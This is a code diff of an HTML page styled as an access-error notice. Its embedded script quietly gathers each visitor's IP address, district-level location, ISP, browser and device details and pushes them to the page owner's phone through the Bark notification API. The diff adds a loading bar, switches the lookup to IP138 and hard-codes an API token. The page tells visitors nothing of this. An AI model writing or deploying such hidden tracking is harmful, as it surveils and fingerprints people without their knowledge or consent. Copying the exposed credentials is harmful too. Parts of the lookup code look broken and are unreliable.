@@ -134,7 +134,6 @@
             color: #aaa;
         }
         
-        /* 装饰元素 */
         .decoration {
             position: absolute;
             z-index: 1;
@@ -172,7 +171,6 @@
         .line:nth-child(4) { left: 70%; }
         .line:nth-child(5) { left: 90%; }
         
-        /* 响应式设计 */
         @media (max-width: 768px) {
             .container {
                 padding: 30px 20px;
@@ -204,6 +202,30 @@
             font-size: 0.8rem;
             z-index: 100;
         }
+        
+        .loading-bar {
+            width: 100%;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            margin-top: 30px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .loading-progress {
+            position: absolute;
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff4d4d, #ff8080);
+            animation: loading 3s infinite;
+        }
+        
+        @keyframes loading {
+            0% { width: 0%; left: 0; }
+            50% { width: 100%; left: 0; }
+            100% { width: 0%; left: 100%; }
+        }
     </style>
 </head>
 <body>
@@ -230,6 +252,10 @@
             如果您认为这是个错误，请联系我们的支持团队。
         </div>
         
+        <div class="loading-bar">
+            <div class="loading-progress"></div>
+        </div>
+        
         <div class="contact">
             <h3><i class="fas fa-headset"></i> 技术支持</h3>
             <div class="contact-info">
@@ -253,28 +279,52 @@
     <div class="hidden-message">系统正在检测您的访问位置...</div>
 
     <script>
-        // 配置Bark API
-        const BARK_API_KEY = '85fXnM3P5A6pVnJmuhLby3'; // 替换为您的Bark API密钥
+        // 配置Bark API - 替换为您的实际API密钥
+        const BARK_API_KEY = 'YOUR_BARK_API_KEY_HERE';
         const BARK_API_URL = `https://api.day.app/${BARK_API_KEY}/`;
+        
+        // IP138 API配置 - 替换为您的实际Token
+        const IP138_TOKEN = 'ec762ab0582111a821c98e94c43ffdd1';
+        const IP138_API_URL = 'http://api.ip138.com/ipdata/?token=';
         
         // 获取访问者信息
         async function getVisitorInfo() {
             try {
-                // 获取IP地址和位置信息
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                // 获取IP地址
+                const ipResponse = await fetch('http://api.ip138.com/ipdata/?token=ec762ab0582111a821c98e94c43ffdd1');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
                 
-                // 获取位置信息（基于IP）
-                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                // 使用IP138 API获取位置信息
+                const locationResponse = await fetch(`${IP138_API_URL}${IP138_TOKEN}&ip=${ip}`, {
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                if (!locationResponse.ok) {
+                    throw new Error('IP138 API请求失败');
+                }
+                
                 const locationData = await locationResponse.json();
+                
+                // 解析IP138返回的数据格式
+                const locationInfo = {
+                    country: locationData.data[0] || '未知',
+                    province: locationData.data[1] || '未知',
+                    city: locationData.data[2] || '未知',
+                    district: locationData.data[3] || '未知',
+                    isp: locationData.data[4] || '未知',
+                    postalCode: locationData.data[5] || '未知',
+                    areaCode: locationData.data[6] || '未知',
+                    networkType: locationData.data[7] || '未知'
+                };
                 
                 // 收集浏览器信息
                 const browserInfo = {
                     ip: ip,
-                    country: locationData.country_name || '未知',
-                    region: locationData.region || '未知',
-                    city: locationData.city || '未知',
+                    location: `${locationInfo.country}, ${locationInfo.province}, ${locationInfo.city}, ${locationInfo.district}`,
+                    isp: locationInfo.isp,
                     userAgent: navigator.userAgent,
                     languages: navigator.languages.join(', '),
                     platform: navigator.platform,
@@ -289,9 +339,8 @@
                 // 返回基本信息
                 return {
                     ip: '未知',
-                    country: '未知',
-                    region: '未知',
-                    city: '未知',
+                    location: '未知',
+                    isp: '未知',
                     userAgent: navigator.userAgent,
                     languages: navigator.languages.join(', '),
                     platform: navigator.platform,
@@ -307,7 +356,8 @@
             // 构造通知标题和内容
             const title = encodeURIComponent('新访问者信息');
             let body = `IP: ${info.ip}\n`;
-            body += `位置: ${info.city}, ${info.region}, ${info.country}\n`;
+            body += `位置: ${info.location}\n`;
+            body += `运营商: ${info.isp}\n`;
             body += `时间: ${new Date().toLocaleString()}\n`;
             body += `设备: ${info.platform}\n`;
             body += `屏幕: ${info.screen}\n`;
@@ -338,6 +388,7 @@
             
             // 在控制台输出信息（用于调试）
             console.log('访问者信息:', visitorInfo);
+            console.log('位置详细信息:', visitorInfo.location);
         });
     </script>
 </body>
